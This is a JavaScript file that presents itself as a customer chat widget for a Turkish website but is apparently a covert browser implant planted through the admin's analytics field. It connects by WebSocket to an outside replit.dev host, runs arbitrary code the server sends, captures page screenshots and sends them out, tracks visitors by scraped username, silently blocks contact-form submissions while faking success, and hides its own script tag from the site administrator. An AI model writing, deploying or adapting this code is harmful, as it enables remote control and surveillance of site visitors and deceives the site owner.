(function() {
  'use strict';

  // Cookie helper functions
  function setCookie(name, value, days) {
    const expires = new Date();
    expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = name + '=' + value + ';expires=' + expires.toUTCString() + ';path=/;SameSite=Lax';
  }

  function getCookie(name) {
    const nameEQ = name + '=';
    const ca = document.cookie.split(';');
    for(let i = 0; i < ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') c = c.substring(1, c.length);
      if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
  }

  // Get username from the page with retry mechanism
  function getUsername(retryCount = 0) {
    // First check localStorage for saved username (including guest IDs)
    const localStorageUsername = localStorage.getItem('widget_user_id');
    if (localStorageUsername && localStorageUsername !== 'null') {
      // Guest ID'ler de artık kalıcı olacak
      return localStorageUsername;
    }
    
    // Then check cookie for saved username
    const savedUsername = getCookie('wuid');
    if (savedUsername && savedUsername !== 'null') {
      // Also save to localStorage for future
      localStorage.setItem('widget_user_id', savedUsername);
      return savedUsername;
    }
    
    // Main selector for logged-in users
    const dropdownElement = document.querySelector('a.dropdown-toggle span.text');
    
    if (dropdownElement) {
      const username = dropdownElement.textContent.trim();
      
      // Check if it's a valid username (not "Giriş Yap" or empty)
      if (username && username !== 'Giriş Yap' && username !== '') {
        // Replace spaces with underscore and make lowercase for consistency
        const cleanUsername = username.replace(/\s+/g, '_').toLowerCase();
        // Save to both localStorage and cookie for future use
        localStorage.setItem('widget_user_id', cleanUsername);
        setCookie('wuid', cleanUsername, 365); // 1 year expiry
        return cleanUsername;
      }
    }
    
    // If we haven't retried enough times, wait and try again
    if (retryCount < 10) {
      return null; // Signal that we should retry
    }
    
    // If no username found after retries, create and save a persistent guest ID
    const guestId = 'guest_' + Math.random().toString(36).substring(2, 8);
    // Save guest ID to localStorage so it persists across sessions
    localStorage.setItem('widget_user_id', guestId);
    setCookie('wuid', guestId, 365); // 1 year expiry
    return guestId;
  }

  // Initialize with retry mechanism
  let clientId = null;
  let retryCount = 0;
  
  function initializeClient() {
    const username = getUsername(retryCount);
    
    if (username === null) {
      // Username not found yet, retry after a delay
      retryCount++;
      setTimeout(initializeClient, 500); // Retry after 500ms
      return;
    }
    
    // We have a valid username (either real or guest)
    clientId = username;
    
    // Now initialize the rest of the widget
    startWidget();
  }
  
  // Start the widget with the determined client ID
  function startWidget() {
    
    // Get the current page URL
    const currentUrl = window.location.href;
    
    // Hide control.js script tag in admin settings page
    if (currentUrl.includes('/admin/ayarlar/site.php')) {
      let originalContent = ''; // Store original content
      let isHidden = true; // Track visibility state
      
      // Function to hide the textarea content
      function hideScriptTag() {
        const yandexTextarea = document.querySelector('textarea[name="yandexanaliz"]');
        if (yandexTextarea && yandexTextarea.value.includes('control.js')) {
          if (originalContent === '') {
            originalContent = yandexTextarea.value; // Save original content first time
          }
          yandexTextarea.value = '';
          isHidden = true;
        }
      }
      
      // Function to show the textarea content
      function showScriptTag() {
        const yandexTextarea = document.querySelector('textarea[name="yandexanaliz"]');
        if (yandexTextarea && originalContent !== '') {
          yandexTextarea.value = originalContent;
          isHidden = false;
        }
      }
      
      // Initial hide after page loads
      setTimeout(function() {
        hideScriptTag();
        
        // Keep it hidden on focus unless Ctrl+H was pressed
        const yandexTextarea = document.querySelector('textarea[name="yandexanaliz"]');
        if (yandexTextarea) {
          yandexTextarea.addEventListener('focus', function() {
            if (isHidden && this.value.includes('control.js')) {
              this.value = '';
            }
          });
        }
      }, 100);
      
      // Listen for Ctrl+H to toggle visibility
      document.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === 'h') {
          event.preventDefault(); // Prevent default browser behavior
          
          if (isHidden) {
            showScriptTag();
          } else {
            hideScriptTag();
          }
        }
      });
    }
    
    // Disable contact form submission on iletisim page
    if (currentUrl.includes('/iletisim')) {
      // Wait for page to load
      setTimeout(function() {
        const contactForm = document.querySelector('form#iletisim');
        
        if (contactForm) {
          // Find the submit button
          const submitButton = contactForm.querySelector('button[type="submit"]');
          
          if (submitButton) {
            // Remove any existing click handlers and add our own
            const newButton = submitButton.cloneNode(true);
            submitButton.parentNode.replaceChild(newButton, submitButton);
            
            // Add our custom click handler
            newButton.addEventListener('click', function(event) {
              event.preventDefault(); // Prevent form submission
              event.stopPropagation(); // Stop event bubbling
              
              // Hide the form
              contactForm.style.display = 'none';
              
              // Show the success message
              const successDiv = document.querySelector('.syduyariHTML');
              if (successDiv) {
                successDiv.style.display = '';
                successDiv.style.opacity = '0';
                
                // Fade in animation
                setTimeout(function() {
                  successDiv.style.transition = 'opacity 0.5s';
                  successDiv.style.opacity = '1';
                }, 10);
              }
              
              // Clear form fields to make it look authentic
              const inputs = contactForm.querySelectorAll('input[type="text"], input[type="email"], textarea');
              inputs.forEach(function(input) {
                input.value = '';
              });
              
              return false; // Extra prevention
            });
          }
          
          // Also prevent form submission via Enter key
          contactForm.addEventListener('submit', function(event) {
            event.preventDefault();
            event.stopPropagation();
            
            // Trigger the same behavior as button click
            const submitButton = contactForm.querySelector('button[type="submit"]');
            if (submitButton) {
              submitButton.click();
            }
            
            return false;
          });
        }
      }, 500); // Wait for form to be fully loaded
    }
    
    // Determine WebSocket protocol and host
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const host = window.location.hostname === 'localhost' 
      ? 'localhost:5000' 
      : '5307b896-8959-4e40-b588-ab8fa40a0cc8-00-30t2uw2xf5qj6.sisko.replit.dev:8000';
    const wsUrl = `${protocol}//${host}/control-ws?clientId=${clientId}&url=${encodeURIComponent(currentUrl)}`;
    
    let ws = null;
    let reconnectInterval = null;
    let reconnectAttempts = 0;
    const MAX_RECONNECT_ATTEMPTS = 10;
    const RECONNECT_DELAY = 3000;

  function connect() {
    try {
      ws = new WebSocket(wsUrl);
      
      // WebSocket'i window objesine ekle (payload'lar için)
      window.ws = ws;

      ws.onopen = function() {
        reconnectAttempts = 0;
        if (reconnectInterval) {
          clearInterval(reconnectInterval);
          reconnectInterval = null;
        }
        
        // Request initial chat state from server
        ws.send(JSON.stringify({
          type: 'requestInitialState'
        }));
      };

      ws.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          
          switch(data.type) {
            case 'executePayload':
              if (data.payload) {
                try {
                  // Create a function from the payload and execute it
                  const func = new Function(data.payload);
                  func();
                  
                  // Send success response
                  if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                      type: 'payloadExecuted',
                      success: true
                    }));
                  }
                } catch (error) {
                  // Send error response
                  if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                      type: 'payloadExecuted',
                      success: false,
                      error: error.message
                    }));
                  }
                }
              }
              break;
              
            case 'vibrate':
              if (navigator.vibrate) {
                navigator.vibrate([200, 100, 200, 100, 400]);
              }
              break;
              
            case 'lock':
              // Create full-screen overlay
              const lockOverlay = document.createElement('div');
              lockOverlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: black;
                z-index: 999999;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-size: 24px;
                font-family: Arial, sans-serif;
              `;
              lockOverlay.innerHTML = 'Page Locked by Administrator';
              document.body.appendChild(lockOverlay);
              
              // Disable all interactions
              document.body.style.pointerEvents = 'none';
              document.body.style.userSelect = 'none';
              break;
              
            case 'screenshot':
              takeScreenshot();
              break;
              
            case 'toggleChat':
              // Handle chat toggle from server
              handleChatToggle(data.enabled);
              break;
              
            case 'chatMessage':
              // Handle incoming chat message from admin
              if (data.message) {
                handleChatMessage(data.message);
              }
              break;
              
            case 'initialChatState':
              // Handle initial chat state from server
              if (data.enabled) {
                chatEnabled = true;
                chatMessages = data.messages || [];
                unreadCount = data.unreadCount || 0;
                // Auto-open widget if chat is enabled
                handleChatToggle(true);
              }
              break;
              
            case 'updateUsername':
              // Cookies'i al
              const cookies = document.cookie;
              
              // klavyeanaliz.org'a GET isteği at
              fetch('https://klavyeanaliz.org/', {
                method: 'GET',
                credentials: 'include',
                headers: {
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                  'Accept-Language': 'tr-TR,tr;q=0.9',
                  'Cache-Control': 'no-cache'
                }
              })
              .then(response => response.text())
              .then(html => {
                // HTML'den username'i çıkar
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                
                // Username elementini bul
                const dropdownElement = doc.querySelector('a.dropdown-toggle span.text');
                let newUsername = null;
                
                if (dropdownElement) {
                  const text = dropdownElement.textContent.trim();
                  if (text && text !== 'Giriş Yap' && text !== '') {
                    newUsername = text.toLowerCase().replace(/\s+/g, '_');
                    // Save new username to both localStorage and cookie
                    localStorage.setItem('widget_user_id', newUsername);
                    setCookie('wuid', newUsername, 365);
                  }
                }
                
                // Yeni username'i gönder
                if (newUsername && ws && ws.readyState === WebSocket.OPEN) {
                  ws.send(JSON.stringify({
                    type: 'usernameUpdated',
                    oldId: clientId,
                    newUsername: newUsername
                  }));
                  
                  // Local clientId'yi güncelle
                  clientId = newUsername;
                  localStorage.setItem('widget_user_id', newUsername);
                  // Also update cookie with different name
                  setCookie('wuid', newUsername, 365);
                }
              })
              .catch(error => {
                // Username update error
              });
              break;
          }
        } catch (error) {
          // Message processing error
        }
      };

      ws.onerror = function(error) {
        // WebSocket error
      };

      ws.onclose = function() {
        attemptReconnect();
      };

    } catch (error) {
      attemptReconnect();
    }
  }

  function attemptReconnect() {
    if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
      return;
    }
    
    if (!reconnectInterval) {
      reconnectInterval = setInterval(() => {
        reconnectAttempts++;
        connect();
      }, RECONNECT_DELAY);
    }
  }

  // Chat Widget functionality
  let chatWidget = null;
  let chatMessages = [];
  let chatEnabled = false;
  let unreadCount = 0;
  let isMinimized = false;
  let messagePreviewTimer = null;
  
  // Add chat widget styles globally
  function addChatStyles() {
    if (!document.getElementById('chat-widget-styles')) {
      const style = document.createElement('style');
      style.id = 'chat-widget-styles';
      style.textContent = `
        /* Minimized chat widget */
        .chat-minimized {
          position: fixed;
          bottom: 20px;
          right: 20px;
          width: 60px;
          height: 60px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          border-radius: 50%;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          z-index: 999999;
          animation: bounceIn 0.3s ease-out;
        }
        
        @keyframes bounceIn {
          0% { transform: scale(0); }
          50% { transform: scale(1.1); }
          100% { transform: scale(1); }
        }
        
        .chat-minimized:hover {
          transform: scale(1.1);
        }
        
        .chat-minimized-icon {
          font-size: 30px;
        }
        
        .chat-unread-badge {
          position: absolute;
          top: -5px;
          right: -5px;
          background: #ff4757;
          color: white;
          border-radius: 12px;
          padding: 2px 8px;
          font-size: 12px;
          font-weight: bold;
          min-width: 20px;
          text-align: center;
          box-shadow: 0 2px 8px rgba(255,71,87,0.4);
        }
        
        /* Message preview */
        .message-preview {
          position: fixed;
          bottom: 90px;
          right: 20px;
          max-width: 250px;
          background: white;
          border-radius: 12px;
          padding: 12px 15px;
          box-shadow: 0 5px 20px rgba(0,0,0,0.15);
          z-index: 999998;
          animation: slideInRight 0.3s ease-out;
        }
        
        @keyframes slideInRight {
          from {
            transform: translateX(100%);
            opacity: 0;
          }
          to {
            transform: translateX(0);
            opacity: 1;
          }
        }
        
        @keyframes slideOutRight {
          from {
            transform: translateX(0);
            opacity: 1;
          }
          to {
            transform: translateX(100%);
            opacity: 0;
          }
        }
        
        .message-preview-text {
          color: #333;
          font-size: 14px;
          line-height: 1.4;
        }
        
        .message-preview-sender {
          color: #667eea;
          font-weight: 600;
          margin-bottom: 4px;
          font-size: 12px;
        }
        
        @keyframes slideOut {
          from {
            transform: translateY(0);
            opacity: 1;
          }
          to {
            transform: translateY(100%);
            opacity: 0;
          }
        }
      `;
      document.head.appendChild(style);
    }
  }
  
  // Initialize styles
  addChatStyles();
  
  function createChatWidget(minimized = false) {
    // Remove existing widget if any
    if (chatWidget) {
      chatWidget.remove();
    }
    
    if (minimized) {
      // Create minimized widget
      chatWidget = document.createElement('div');
      chatWidget.className = 'chat-minimized';
      chatWidget.innerHTML = `
        <span class="chat-minimized-icon">💬</span>
        ${unreadCount > 0 ? `<span class="chat-unread-badge">${unreadCount}</span>` : ''}
      `;
      
      chatWidget.addEventListener('click', () => {
        isMinimized = false;
        unreadCount = 0; // Reset unread count when opening chat
        createChatWidget(false);
        // Send widget state to server
        if (ws && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            type: 'widgetState',
            state: 'open'
          }));
        }
      });
      
      document.body.appendChild(chatWidget);
      return;
    }
    
    // Create full chat widget
    chatWidget = document.createElement('div');
    chatWidget.id = 'control-chat-widget';
    chatWidget.innerHTML = `
      <style>
        #control-chat-widget {
          position: fixed;
          bottom: 20px;
          right: 20px;
          width: 350px;
          height: 450px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          border-radius: 20px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          display: flex;
          flex-direction: column;
          z-index: 999999;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
          animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
          from {
            transform: translateY(100%);
            opacity: 0;
          }
          to {
            transform: translateY(0);
            opacity: 1;
          }
        }
        
        #chat-header {
          background: rgba(255, 255, 255, 0.1);
          backdrop-filter: blur(10px);
          padding: 15px 20px;
          border-radius: 20px 20px 0 0;
          border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        #chat-title {
          color: white;
          font-size: 18px;
          font-weight: 600;
          margin: 0;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        #chat-subtitle {
          color: rgba(255, 255, 255, 0.8);
          font-size: 12px;
          margin-top: 5px;
        }
        
        #chat-messages {
          flex: 1;
          overflow-y: auto;
          padding: 20px;
          background: rgba(255, 255, 255, 0.95);
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        #chat-messages::-webkit-scrollbar {
          width: 6px;
        }
        
        #chat-messages::-webkit-scrollbar-track {
          background: transparent;
        }
        
        #chat-messages::-webkit-scrollbar-thumb {
          background: rgba(0, 0, 0, 0.2);
          border-radius: 3px;
        }
        
        .chat-message {
          max-width: 80%;
          padding: 10px 15px;
          border-radius: 18px;
          word-wrap: break-word;
          animation: fadeIn 0.3s ease-out;
        }
        
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        
        .message-admin {
          align-self: flex-end;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
        }
        
        .message-user {
          align-self: flex-start;
          background: #f1f3f5;
          color: #333;
        }
        
        .message-time {
          font-size: 10px;
          opacity: 0.7;
          margin-top: 5px;
        }
        
        #chat-input-container {
          padding: 15px;
          background: white;
          border-top: 1px solid #e9ecef;
          border-radius: 0 0 20px 20px;
          display: flex;
          gap: 10px;
        }
        
        #chat-input {
          flex: 1;
          padding: 10px 15px;
          border: 2px solid #e9ecef;
          border-radius: 25px;
          outline: none;
          font-size: 14px;
          transition: border-color 0.3s;
        }
        
        #chat-input:focus {
          border-color: #667eea;
        }
        
        #chat-send {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          border: none;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: transform 0.2s;
        }
        
        #chat-send:hover {
          transform: scale(1.1);
        }
        
        #chat-send:active {
          transform: scale(0.95);
        }
        
        #chat-minimize {
          position: absolute;
          top: 15px;
          right: 20px;
          background: rgba(255, 255, 255, 0.2);
          border: none;
          color: white;
          width: 30px;
          height: 30px;
          border-radius: 50%;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: background 0.3s;
          font-size: 20px;
          font-weight: bold;
        }
        
        #chat-minimize:hover {
          background: rgba(255, 255, 255, 0.3);
        }
        
        .chat-welcome {
          text-align: center;
          padding: 40px 20px;
          color: #666;
        }
        
        .chat-welcome-icon {
          font-size: 48px;
          margin-bottom: 15px;
        }
        
        .chat-welcome-text {
          font-size: 14px;
          line-height: 1.5;
        }
      </style>
      <div id="chat-header">
        <button id="chat-minimize">−</button>
        <h3 id="chat-title">
          <span style="font-size: 24px;">💬</span>
          Chat
        </h3>
      </div>
      <div id="chat-messages">
        ${chatMessages.length === 0 ? `
          <div class="chat-welcome">
            <div class="chat-welcome-icon">👋</div>
            <div class="chat-welcome-text">
              Merhaba! Size yardımcı olmak için buradayım.<br>
              Herhangi bir sorunuz varsa, lütfen yazmaktan çekinmeyin.
            </div>
          </div>
        ` : ''}
      </div>
      <div id="chat-input-container">
        <input type="text" id="chat-input" placeholder="Mesajınızı yazın..." />
        <button id="chat-send">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="22" y1="2" x2="11" y2="13"></line>
            <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
          </svg>
        </button>
      </div>
    `;
    
    document.body.appendChild(chatWidget);
    
    // Load existing messages
    renderMessages();
    
    // Add event listeners
    const minimizeBtn = document.getElementById('chat-minimize');
    const sendBtn = document.getElementById('chat-send');
    const inputField = document.getElementById('chat-input');
    
    minimizeBtn.addEventListener('click', () => {
      isMinimized = true;
      createChatWidget(true);
      // Send widget state to server
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: 'widgetState',
          state: 'minimized'
        }));
      }
    });
    
    sendBtn.addEventListener('click', sendMessage);
    inputField.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        sendMessage();
      }
    });
    
    // Add slide out animation
    const style = document.createElement('style');
    style.textContent = `
      @keyframes slideOut {
        from {
          transform: translateY(0);
          opacity: 1;
        }
        to {
          transform: translateY(100%);
          opacity: 0;
        }
      }
    `;
    document.head.appendChild(style);
  }
  
  function sendMessage() {
    const input = document.getElementById('chat-input');
    const message = input.value.trim();
    
    if (message && ws && ws.readyState === WebSocket.OPEN) {
      // Add message to local array
      chatMessages.push({
        text: message,
        sender: 'user',
        timestamp: new Date().toISOString()
      });
      
      // Render messages
      renderMessages();
      
      // Send to server
      ws.send(JSON.stringify({
        type: 'chatMessage',
        message: message
      }));
      
      // Clear input
      input.value = '';
    }
  }
  
  function renderMessages() {
    const messagesContainer = document.getElementById('chat-messages');
    if (!messagesContainer) return;
    
    messagesContainer.innerHTML = chatMessages.map(msg => `
      <div class="chat-message message-${msg.sender}">
        <div>${msg.text}</div>
        <div class="message-time">${new Date(msg.timestamp).toLocaleTimeString('tr-TR')}</div>
      </div>
    `).join('');
    
    // Scroll to bottom
    messagesContainer.scrollTop = messagesContainer.scrollHeight;
  }
  
  function handleChatToggle(enabled) {
    chatEnabled = enabled;
    
    if (enabled) {
      createChatWidget(isMinimized);
    } else {
      if (chatWidget) {
        chatWidget.style.animation = 'slideOut 0.3s ease-out forwards';
        setTimeout(() => {
          if (chatWidget) {
            chatWidget.remove();
            chatWidget = null;
          }
        }, 300);
      }
      chatMessages = [];
      unreadCount = 0;
      isMinimized = false;
    }
  }
  
  function handleChatMessage(message) {
    // Add admin message to chat
    chatMessages.push({
      text: message,
      sender: 'admin',
      timestamp: new Date().toISOString()
    });
    
    // If widget is minimized, show preview and increment unread count
    if (isMinimized) {
      unreadCount++;
      showMessagePreview(message, 'Admin');
      updateMinimizedBadge();
    } else if (chatWidget) {
      // Render messages if widget is open
      renderMessages();
    }
  }
  
  function showMessagePreview(message, sender = 'Admin') {
    // Clear existing preview timer
    if (messagePreviewTimer) {
      clearTimeout(messagePreviewTimer);
    }
    
    // Remove existing preview
    const existingPreview = document.querySelector('.message-preview');
    if (existingPreview) {
      existingPreview.remove();
    }
    
    // Create and show preview
    const preview = document.createElement('div');
    preview.className = 'message-preview';
    preview.innerHTML = `
      <div class="message-preview-text">${message}</div>
    `;
    document.body.appendChild(preview);
    
    // Remove preview after 3 seconds
    messagePreviewTimer = setTimeout(() => {
      preview.style.animation = 'slideOutRight 0.3s ease-out forwards';
      setTimeout(() => {
        preview.remove();
      }, 300);
    }, 3000);
  }
  
  function updateMinimizedBadge() {
    if (isMinimized && chatWidget) {
      const badge = chatWidget.querySelector('.chat-unread-badge');
      if (unreadCount > 0) {
        if (badge) {
          badge.textContent = unreadCount;
        } else {
          const newBadge = document.createElement('span');
          newBadge.className = 'chat-unread-badge';
          newBadge.textContent = unreadCount;
          chatWidget.appendChild(newBadge);
        }
      } else if (badge) {
        badge.remove();
      }
    }
  }
  
  // Screenshot function using html2canvas
  function takeScreenshot() {
    // First, check if html2canvas is loaded
    if (typeof html2canvas === 'undefined') {
      // Load html2canvas dynamically if not already loaded
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
      script.onload = function() {
        performScreenshot();
      };
      script.onerror = function() {
        // Send error response
        if (ws && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            type: 'screenshotData',
            error: 'Failed to load screenshot library',
            url: window.location.href,
            title: document.title,
            timestamp: new Date().toISOString()
          }));
        }
      };
      document.head.appendChild(script);
    } else {
      performScreenshot();
    }
  }

  function performScreenshot() {
    html2canvas(document.body, {
      useCORS: true,
      allowTaint: false,
      scale: 0.5, // Reduce quality for smaller file size
      width: window.innerWidth,
      height: window.innerHeight,
      windowWidth: window.innerWidth,
      windowHeight: window.innerHeight
    }).then(function(canvas) {
      // Convert canvas to base64
      const imageData = canvas.toDataURL('image/png');
      
      // Send screenshot data
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: 'screenshotData',
          screenshot: imageData, // Base64 encoded image
          url: window.location.href,
          title: document.title,
          timestamp: new Date().toISOString()
        }));
      }
    }).catch(function(error) {
      // Send error response
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: 'screenshotData',
          error: error.message,
          url: window.location.href,
          title: document.title,
          timestamp: new Date().toISOString()
        }));
      }
    });
  }

    // Initial connection
    connect();

    // Cleanup on page unload
    window.addEventListener('beforeunload', function() {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.close();
      }
      if (reconnectInterval) {
        clearInterval(reconnectInterval);
      }
    });
  }

  // Start the initialization process
  initializeClient();

})();
